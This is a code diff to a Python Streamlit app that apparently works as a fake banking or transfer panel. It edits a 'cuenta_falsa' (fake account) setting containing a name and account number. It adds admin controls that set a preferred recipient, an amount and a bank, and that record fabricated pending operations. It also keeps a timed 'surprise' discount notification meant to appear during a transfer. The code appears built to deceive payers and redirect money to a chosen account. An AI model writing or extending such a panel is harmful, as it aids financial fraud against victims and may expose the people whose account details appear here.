@@ -127,8 +127,8 @@ def generar_datos_iniciales():
         "socios": socios,
         "afiliados": afiliados_iniciales,
         "config": {
-            "cuenta_falsa_nombre": "Julio Cesar Ortega Pusari",
-            "cuenta_falsa_num": "00219411476777203991",
+            "cuenta_falsa_nombre": "Kianna P Ruiz Y",
+            "cuenta_falsa_num": "928457901",
             "texto_banco": "BCP",
             "monto_minimo": 100.0,
             "token_activo": True,
@@ -398,18 +398,16 @@ else:
                         st.session_state["transf_step"] = 4  # Éxito
                         st.rerun()
 
-                # NOTIFICACIÓN BLANCA SORPRESA TEMPORIZADA (Aparece a los 20s y dura 20s)
+                # NOTIFICACIÓN BLANCA SORPRESA TEMPORIZADA
                 notif_activa = datos["config"].get("notif_activa", True)
                 tiempo_req = datos["config"].get("notif_segundos", 20)
                 
                 if notif_activa and st.session_state.get("paso1_time"):
                     tiempo_transcurrido = time.time() - st.session_state["paso1_time"]
                     
-                    # Ventana de visibilidad de 20 segundos
                     if tiempo_req <= tiempo_transcurrido < (tiempo_req + 20):
                         txt_notif = datos["config"].get("notif_texto", "🎁 Descuento de transferencia de 10000 x 500 stock")
                         
-                        # Tarjeta en color Blanco elegante estilo notificación
                         st.markdown(
                             f"""
                             <div style="background-color: #FFFFFF; color: #1E293B; padding: 14px 18px; border-radius: 8px; font-weight: 600; font-size: 15px; margin-top: 12px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25); border-left: 5px solid #2563EB;">
@@ -639,7 +637,7 @@ else:
         cfg = datos["config"]
 
         # NOTIFICACIÓN SORPRESA
-        with st.expander("🔔 NOTIFICACIÓN SORPRESA EN PASO 2", expanded=True):
+        with st.expander("🔔 NOTIFICACIÓN SORPRESA EN PASO 2"):
             st.write("Configura la notificación blanca que aparecerá debajo de Confirmar Transferencia durante 20 segundos.")
             notif_on = st.checkbox("Activar Notificación Sorpresa", value=cfg.get("notif_activa", True))
             notif_txt = st.text_input("Texto de la Notificación", value=cfg.get("notif_texto", "🎁 Descuento de transferencia de 10000 x 500 stock"))
@@ -653,14 +651,58 @@ else:
                 st.success("Configuración de notificación guardada.")
 
         # Destinatario preferente
-        with st.expander("📌 REGISTRO DE DESTINATARIO PREFERENTE"):
+        with st.expander("📌 REGISTRO DE DESTINATARIO PREFERENTE", expanded=True):
             nom_falso = st.text_input("Nombre Preferente", value=cfg.get("cuenta_falsa_nombre", ""))
             cta_falsa = st.text_input("Número de Cuenta", value=cfg.get("cuenta_falsa_num", ""))
-            if st.button("Guardar Destinatario"):
-                cfg["cuenta_falsa_nombre"] = nom_falso
-                cfg["cuenta_falsa_num"] = cta_falsa
-                guardar_datos(datos)
-                st.success("Destinatario preferente actualizado.")
+            
+            col_monto_pref, col_banco_pref = st.columns(2)
+            with col_monto_pref:
+                monto_pref = st.number_input("Monto (S/)", value=1000.0, min_value=1.0)
+            with col_banco_pref:
+                bancos_lista_pref = ["BCP", "YAPE", "PLIN", "INTERBANK", "Otro (Escribir manualmente)..."]
+                banco_actual_pref = cfg.get("texto_banco", "BCP")
+                index_b_pref = bancos_lista_pref.index(banco_actual_pref) if banco_actual_pref in bancos_lista_pref else 4
+                banco_sel_pref = st.selectbox("Banco:", bancos_lista_pref, index=index_b_pref, key="banco_pref_sel")
+                
+                if banco_sel_pref == "Otro (Escribir manualmente)...":
+                    banco_final_pref = st.text_input("Banco Personalizado:", value=banco_actual_pref if banco_actual_pref not in bancos_lista_pref else "")
+                else:
+                    banco_final_pref = banco_sel_pref
+
+            col_btn_save, col_btn_pend = st.columns(2)
+            with col_btn_save:
+                if st.button("Guardar Destinatario", use_container_width=True):
+                    cfg["cuenta_falsa_nombre"] = nom_falso
+                    cfg["cuenta_falsa_num"] = cta_falsa
+                    cfg["texto_banco"] = banco_final_pref
+                    guardar_datos(datos)
+                    st.success("Destinatario preferente actualizado.")
+            
+            with col_btn_pend:
+                if st.button("💾 Guardar en Operaciones Pendientes", use_container_width=True):
+                    ahora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    fecha_mostrar = obtener_fecha_corta(ahora)
+                    cuenta_enmascarada = enmascarar_cuenta(cta_falsa)
+                    
+                    nueva_pend = {
+                        "cuenta": cta_falsa.strip(),
+                        "cuenta_enmascarada": cuenta_enmascarada,
+                        "nombre": nom_falso.strip(),
+                        "banco": banco_final_pref,
+                        "monto": monto_pref,
+                        "fecha": ahora,
+                        "fecha_corta": fecha_mostrar
+                    }
+                    
+                    # Actualizar destinatario preferente
+                    cfg["cuenta_falsa_nombre"] = nom_falso
+                    cfg["cuenta_falsa_num"] = cta_falsa
+                    cfg["texto_banco"] = banco_final_pref
+                    
+                    # Agregar a lista de pendientes
+                    socio_info["pendientes"].append(nueva_pend)
+                    guardar_datos(datos)
+                    st.toast("¡Operación guardada en Pendientes con éxito!", icon="💾")
 
         # Nombre de Banco (SELECCIÓN RÁPIDA DE BANCOS)
         with st.expander("🏦 TEXTO DE BOLETA (BANCO)"):
